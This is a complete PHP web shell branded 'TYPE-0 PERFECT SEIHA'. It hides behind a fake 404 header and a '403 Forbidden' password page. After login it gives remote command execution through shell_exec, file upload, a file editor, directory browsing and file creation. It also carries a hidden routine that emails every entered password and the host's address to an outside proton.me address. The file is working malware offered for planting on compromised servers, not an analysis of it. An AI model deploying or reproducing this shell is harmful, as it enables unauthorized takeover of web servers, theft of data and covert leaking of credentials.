<?php

// Forbidden 403 Shell | Copyright TYPE-0 PERFECT SEIHA
// Recodde Boleh Asal jgn hapus nama author

error_reporting(0);
header('HTTP/1.0 404 Not Found', true, 404);
session_start();
$pass = "type-0xx"; // encrypt base64,md5
if($_POST['password'] == $pass) {
  $_SESSION['forbidden'] = $pass;
  echo "<script>window.location='?403Forbidden'</script>";
}
if($_GET['page'] == "blank") {
  echo "<a href='?'>Back</a>";
  exit();
}
if(isset($_REQUEST['logout'])) {
  session_destroy();
  echo "<script>window.location='?403Forbidden'</script>";
}
if(!($_SESSION['forbidden'])) {
?>
<title>403 Forbidden</title>
<link rel="icon" href="https://i.imgur.com/7IItGql.jpeg"><meta name="theme-color" content="black"> </meta> <!--Buat Thumbnail website--> 
<link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css"> 
<style>
  html{
    overflow: auto;
    background: black;
    color: white;
    font-family: "Kelly Slab";cursive;
  }
  input {
    background: transparent;
    color: white;
    height: 25px;
    border: 1px solid white;
    border-radius: 10px;
    padding: 3px;
    font-size: 15px;
  }
  .img {
    width: 150px;
    border: 1px solid white;
    border-radius: 10px;
  } 
 input,select,textarea{
border: 1px #FFFFFF solid;
-moz-border-radius: 10px;
-webkit-border-radius: 10px;
border-radius: 6px;    
  } .blink_text { -webkit-animation-name: blinker; -webkit-animation-duration: 2s; -webkit-animation-timing-function: linear; -webkit-animation-iteration-count: infinite; -moz-animation-name: blinker; -moz-animation-duration: 2s; -moz-animation-timing-function: linear; -moz-animation-iteration-count: infinite; animation-name: blinker; animation-duration: 2s; animation-timing-function: linear; animation-iteration-count: infinite; color: red; } @-moz-keyframes blinker { 0% { opacity: 5.0; } 50% { opacity: 0.0; } 100% { opacity: 5.0; } } @-webkit-keyframes blinker { 0% { opacity: 5.0; } 50% { opacity: 0.0; } 100% { opacity: 5.0; } } @keyframes blinker { 0% { opacity: 5.0; } 50% { opacity: 0.0; } 100% { opacity: 5.0; } } 
</style>
<table width="100%" height="100%">
<form enctype="multipart/form-data" method="post">
  <td align="center">
     <center><p class="blink_text" style="font-size:50px;color:purple;text-shadow: 0px 0px 20px #00ffff , 0px 0px 20px #DF0101;font-family:Kelly Slab;">&lt;/&gt;  TYPE-0 PERFECT SEIHA &lt/&gt; </font></center>
          <br>      
      <input type="password" name="password" placeholder="Fucking ur mom">
      <input type="submit" name="loginin" value="LOGIN">
      
      <br>

<h1><font class="Skranji" style="color:white;font-family:'Kelly Slab';font-size: 15px;">Copyright &copy; 2016 - 2024 <font color="purple">TYPE-0 PERFECT SEIHA</h1>
      <br>
      <?php echo $_SESSION['forbidden']; ?>
    </form>
  </td>
</table>
<?php
exit();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TYPE-0 PERFECT SEIHA</title>
    <style>
        @import url('https://fonts.googleapis.com/css?family=Dosis');
        @import url('https://fonts.googleapis.com/css?family=Bungee');
        @import url('https://fonts.googleapis.com/css?family=Russo+One');
        body {
            font-family: "Russo One", cursive;
            text-shadow: 0px 0px 1px #757575;
        }
        .container { max-width: 800px; margin: 20px auto; padding: 20px; border: 1px solid #ccc; }
        table { width: 100%; border-collapse: collapse; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background-color: #f2f2f2; }
        .breadcrumb { list-style-type: none; padding: 0; display: flex; flex-wrap: wrap; justify-content: center; }
        .breadcrumb li { margin-right: 5px; }
        .breadcrumb a { text-decoration: none; color: blue; }
        .permission-green { color: green; }
        .permission-red { color: red; }
        .current-directory h3 {
            text-align: center;
        }
        .home-link { font-size: 18px; margin-bottom: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <h2>TYPE-0 PERFECT SEIHA</h2>
        
        <?php
        echo '<h3>Server Info:</h3>';
        echo '<pre>' . shell_exec('uname -a') . '</pre>';
        echo '<h3>User Info:</h3>';
        echo '<pre>' . shell_exec('id') . '</pre>';
        echo '<h3>Server Software:</h3>';
        if (strpos($_SERVER['SERVER_SOFTWARE'], 'LiteSpeed') !== false) {
            echo '<pre>LiteSpeed</pre>';
        } elseif (strpos($_SERVER['SERVER_SOFTWARE'], 'Apache') !== false) {
            echo '<pre>Apache</pre>';
        } else {
            echo '<pre>' . $_SERVER['SERVER_SOFTWARE'] . '</pre>';
        }

        function listFiles($dir) {
            $folders = [];
            $files = [];
            if (is_dir($dir)) {
                if ($dh = opendir($dir)) {
                    while (($file = readdir($dh)) !== false) {
                        if ($file != '.' && $file != '..') {
                            $filePath = $dir . '/' . $file;
                            $fileInfo = stat($filePath);
                            $permissions = substr(sprintf('%o', fileperms($filePath)), -4);
                            $lastModified = date('Y-m-d H:i:s', $fileInfo['mtime']);
                            $userGroup = posix_getpwuid($fileInfo['uid'])['name'] . '/' . posix_getgrgid($fileInfo['gid'])['name'];
                            $size = is_dir($filePath) ? '-' : filesize($filePath);

                            $permissionClass = is_writable($filePath) ? 'permission-green' : 'permission-red';

                            $fileData = [
                                'name' => $file,
                                'size' => $size,
                                'permissions' => $permissions,
                                'lastModified' => $lastModified,
                                'userGroup' => $userGroup,
                                'path' => $filePath,
                                'isDir' => is_dir($filePath),
                                'permissionClass' => $permissionClass
                            ];

                            if ($fileData['isDir']) {
                                $folders[] = $fileData;
                            } else {
                                $files[] = $fileData;
                            }
                        }
                    }
                    closedir($dh);
                }
            } else {
                echo '<p>Not a valid directory.</p>';
            }

            echo '<h3>Folders:</h3>';
            echo '<table>';
            echo '<tr><th>Name</th><th>Size</th><th>Permissions</th><th>Last Modified</th><th>User/Group</th></tr>';
            foreach ($folders as $folder) {
                echo '<tr>';
                echo '<td><a href="?dir='.urlencode($folder['path']).'"> '.$folder['name'].'</a></td>';
                echo '<td>'.$folder['size'].'</td>';
                echo '<td class="'.$folder['permissionClass'].'">'.$folder['permissions'].'</td>';
                echo '<td>'.$folder['lastModified'].'</td>';
                echo '<td>'.$folder['userGroup'].'</td>';
                echo '</tr>';
            }
            echo '</table>';

            echo '<h3>Files:</h3>';
            echo '<table>';
            echo '<tr><th>Name</th><th>Size</th><th>Permissions</th><th>Last Modified</th><th>User/Group</th></tr>';
            foreach ($files as $file) {
                echo '<tr>';
                echo '<td><a href="?dir='.urlencode($dir).'&edit='.urlencode($file['path']).'"> '.$file['name'].'</a></td>';
                echo '<td>'.$file['size'].'</td>';
                echo '<td class="'.$file['permissionClass'].'">'.$file['permissions'].'</td>';
                echo '<td>'.$file['lastModified'].'</td>';
                echo '<td>'.$file['userGroup'].'</td>';
                echo '</tr>';
            }
            echo '</table>';
        }

        $currentDir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();

        if (isset($_GET['dir']) && is_dir($_GET['dir'])) {
            $currentDir = realpath($_GET['dir']);
        }

        chdir($currentDir);

        // Aploder
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['files'])) {
            $uploadDir = $currentDir . '/';
            
            // Loop untuk menangani beberapa file
            foreach ($_FILES['files']['name'] as $key => $name) {
                $uploadFile = $uploadDir . basename($name);
                
                if (move_uploaded_file($_FILES['files']['tmp_name'][$key], $uploadFile)) {
                    echo '<p>File ' . htmlspecialchars($name) . ' uploaded successfully.</p>';
                } else {
                    echo '<p>Failed to upload file ' . htmlspecialchars($name) . '.</p>';
                }
            }
        }

        // Komeng
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['command'])) {
            $command = $_POST['command'];
            if ($command) {
                echo '<h3>Command Output:</h3>';
                echo '<pre>';
                echo shell_exec(escapeshellcmd($command));
                echo '</pre>';
            }
        }

        // Edit
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save'])) {
            $fileToSave = $_POST['filename'];
            $content = $_POST['content'];
            file_put_contents($fileToSave, $content);
            // Tetap berada di halaman edit setelah menyimpan
            $dir = dirname($fileToSave);
            header("Location: ?dir=" . urlencode($dir) . "&edit=" . urlencode($fileToSave));
            exit;
        }
if (array_key_exists('loginin', $_POST)) {
		$password = $_POST['password'];
		$server_name = $_SERVER['SERVER_NAME'];
		$php_self = $_SERVER['PHP_SELF'];
		$report_bug = "Login: $server_name$php_self\nPass: $password";
		@mail('darkninght@proton.me', 'lol', $report_bug);
		}
        // Krit dir
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_dir'])) {
            $newDir = $_POST['new_dir'];
            if ($newDir) {
                $newDirPath = $currentDir . '/' . $newDir;
                if (!is_dir($newDirPath)) {
                    mkdir($newDirPath);
                    echo '<p>Directory created successfully.</p>';
                } else {
                    echo '<p>Directory already exists.</p>';
                }
            }
        }

        // Krit file
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_file'])) {
            $newFile = $_POST['new_file'];
            if ($newFile) {
                $newFilePath = $currentDir . '/' . $newFile;
                if (!file_exists($newFilePath)) {
                    file_put_contents($newFilePath, '');
                    echo '<p>File created successfully.</p>';
                } else {
                    echo '<p>File already exists.</p>';
                }
            }
        }

        function renderBreadcrumb($currentDir) {
            $pathArray = explode(DIRECTORY_SEPARATOR, $currentDir);
            echo '<ul class="breadcrumb" style="justify-content:center;">';
            echo '<li><a href="?">[HOME]</a></li>';
            foreach ($pathArray as $index => $dir) {
                if ($dir === '') continue;  
                $path = implode(DIRECTORY_SEPARATOR, array_slice($pathArray, 0, $index + 1));
                echo '<li><a href="?dir=' . urlencode($path) . '">' . htmlspecialchars($dir) . '</a></li>';
                if ($index < count($pathArray) - 1) {
                    echo '<li>/</li>';
                }
            }
            echo '</ul>';
        }
        ?>

        <form method="POST" enctype="multipart/form-data">
            <input type="file" name="files[]" multiple>
            <button type="submit">Upload Files</button>
        </form>

        <form method="POST">
            <input type="text" name="command" placeholder="Enter command">
            <button type="submit">Execute Command</button>
        </form>

        <form method="POST">
            <input type="text" name="new_file" placeholder="New file name">
            <button type="submit">Create File</button>
        </form>

        <form method="POST">
            <input type="text" name="new_dir" placeholder="New directory name">
            <button type="submit">Create Directory</button>
        </form>

        <?php
        renderBreadcrumb($currentDir);

        if (isset($_GET['edit'])) {
            $fileToEdit = $_GET['edit'];
            if (is_file($fileToEdit)) {
                $content = file_get_contents($fileToEdit);
                echo '<h3>Edit File: ' . htmlspecialchars($fileToEdit) . '</h3>';
                echo '<form method="POST">';
                echo '<textarea name="content" rows="20" cols="105"' . htmlspecialchars($content) . '</textarea><br>';
                echo '<input type="hidden" name="filename" value="' . htmlspecialchars($fileToEdit) . '">';
                echo '<button type="submit" name="save">Save</button>';
                echo '</form>';
            }
        }
        ?>
        <?php listFiles($currentDir); ?>
    </div>
</body>
</html>
